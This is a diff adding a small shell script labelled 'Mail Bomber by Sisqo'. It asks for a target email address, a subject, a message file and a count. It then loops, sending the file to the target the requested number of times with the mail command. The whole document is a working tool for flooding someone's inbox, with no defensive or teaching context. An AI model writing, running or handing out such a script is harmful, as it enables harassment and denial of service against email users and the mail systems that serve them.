@@ -1,0 +1,36 @@
+# by kjhasdsas
+# by kjhasdsas
+# by kjhasdsas
+# by kjhasdsas
+
+echo -n "Password: "
+echo
+    clear
+    echo "Mail Bomber by Sisqo"
+    echo
+    echo "Lets go ..."
+    echo
+
+echo
+count=0
+no_msgs=0
+echo -n "Email: "
+read email
+echo -n "Subiect: "
+read subject
+echo -n "File: "
+read bomb_msg
+echo -n "Number of messages: "
+read no_msgs
+if test ! -e $bomb_msg ; then
+    echo "The file" "$bomb_msg" "does not exist."
+else
+    while test $count != $no_msgs
+    do
+	cat $bomb_msg | mail -s "$subject" $email
+	echo -n .
+	count=$((count + 1))
+    done
+fi
+echo
+
